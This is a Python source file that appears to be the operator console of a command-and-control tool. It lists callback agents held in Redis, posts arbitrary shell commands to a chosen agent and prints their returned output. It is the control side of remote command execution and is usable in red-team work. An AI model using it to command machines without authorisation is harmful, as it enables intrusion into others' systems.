import redis
import requests
import os
import time

RED = "\033[1;31m"
GREEN = "\033[1;92m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)

header = {"Content-Type": "application/json"}

def send_cmd(url, cmd):
    id = os.getenv('UUID')
    json_payload = {"uuid": id, "command": cmd}
    response = requests.post(url, json=json_payload, headers=header)
    
    if cmd == "exit":
        return

    if response.status_code == 200:
        key = f"{os.getenv('UUID')}-output"
        while True:
            if r.exists(key):
                bruh = r.lindex(key, -1)
                #print("Data sent confirmed: ", key)
                output = r.rpop(key)
                print(output)
                break
            else:
                time.sleep(1)
                continue

def agents(*args):
    if r.exists("agents") == 0:
        print(f"{CYAN}No Callbacks Yet!{RESET}")
        return

    agent_list = r.lrange("agents", 0, -1)
    
    for i in range(len(agent_list)):
        print(f'{i}) {agent_list[i]}')
    try:
        index = int(input(f"{CYAN}Select an Agent: {RESET}"))
        if index > len(agent_list) - 1:
            print(f"{RED}ERROR: Invalid agent index {RESET}")
            return
    except:
        print(f"{RED}ERROR: Input must be a number {RESET}")
        return
    os.environ['UUID'] = agent_list[index]

def uuid(*args):
    id = os.getenv('UUID')
    print(f"{CYAN}Current UUID: {RESET}{id}")

def history(length):
    if length:
        tmp = int(length)
        index = -tmp
    else:
        index = 1
    raw = r.lrange(os.getenv('UUID'), index, -1)
    hist = []
    for i in range(len(raw)):
        if raw[i] != "SEEN" and raw[i] != "AGENT REGISTERED":
            hist.append(raw[i])
    
    for i in range(len(hist)):
        print(f'{i}) {hist[i]}')

def clear(*args):
    os.system("clear")

def delete(name):
    # Check if they pass an argument
    if name != None and r.exists(name):
        r.delete(name)
        r.lrem("agents", 0, name)
        del os.environ['UUID']
    else:
        agent_list = r.lrange("agents", 0, -1)
        for i in range(len(agent_list)):
            print(f'{i}) {agent_list[i]}')
        try:
            index = int(input(f"{CYAN}Select an Agent to Delete: {RESET}"))
            if index > len(agent_list) - 1:
                print(f"{RED}ERROR: Invalid agent index {RESET}")
                return
        except:
            print(f"{RED}ERROR: Input must be a number {RESET}")
            return
        r.delete(agent_list[index])
        r.lrem("agents", 0, agent_list[index])
        del os.environ['UUID']